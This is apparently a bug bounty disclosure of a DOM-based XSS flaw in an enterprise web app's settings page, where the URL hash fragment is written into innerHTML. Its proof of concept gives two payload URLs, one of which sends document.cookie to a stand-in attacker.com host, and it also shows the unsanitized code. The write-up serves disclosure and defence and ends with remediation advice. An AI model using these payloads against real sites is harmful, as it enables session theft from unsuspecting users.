# Title: DOM-Based Cross-Site Scripting via Hash Fragment Injection

- **Platform**: Synack
- **Program**: Enterprise Web Application
- **Severity**: Medium
- **Date**: August 2024
- **Researcher**: Haroon Hameed
- **Bounty**: $350

## Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability was identified in an enterprise web application tested through the Synack Red Team platform. The application improperly handled URL hash fragment data (`window.location.hash`) when rendering dynamic page content, allowing an attacker to inject arbitrary JavaScript that executed in the victim's browser.

## Technical Details

The application used client-side JavaScript to read the URL hash fragment and write its value directly into the DOM using `innerHTML`. Specifically, a script on the settings page would parse `location.hash` to determine which tab or section to display, then inject the parsed value into a container element without sanitization:

```javascript
var tab = window.location.hash.substring(1);
document.getElementById('tabContent').innerHTML = tab;
```

Since `innerHTML` interprets HTML strings and renders them as DOM nodes, an attacker-controlled hash value containing HTML/JavaScript would execute immediately upon page load. No server-side interaction was required, making this a classic DOM-based XSS scenario.

## Steps to Reproduce

1. Identify the vulnerable page that reads `window.location.hash` and writes it to the DOM
2. Craft a URL containing a malicious payload in the hash fragment
3. Send the crafted URL to a victim (or access it in a browser)
4. The payload executes without any request to the server

## Proof of Concept

Craft a URL such as:

```
https://target.app.com/settings#<img src=x onerror=alert(document.cookie)>
```

Or using a more stealthy approach:

```
https://target.app.com/settings#<svg onload=fetch('https://attacker.com/steal?c='+document.cookie)>
```

When the victim visits this URL, the JavaScript in the page reads `location.hash`, extracts everything after `#`, and assigns it to `innerHTML`. The browser parses the injected HTML and executes the `onerror` or `onload` event handler.

## Impact

An attacker could use this vulnerability to:
- Exfiltrate session cookies and authentication tokens
- Perform actions on behalf of the authenticated victim
- Redirect users to phishing pages
- Modify the appearance and content of the page

The attack requires no server-side interaction and bypasses server-side input validation, as the payload never reaches the server.

## Remediation

- Replace `innerHTML` with `textContent` or `innerText` when inserting user-controlled data
- If HTML rendering is required, use a proper sanitization library like DOMPurify
- Validate and encode hash fragment values before processing
- Implement Content Security Policy (CSP) headers as a defense-in-depth measure

## References
- https://medium.com/@haroonhameed_76621/dom-based-xss-for-fun-and-profit-bug-bounty-poc-f4b9554e95d
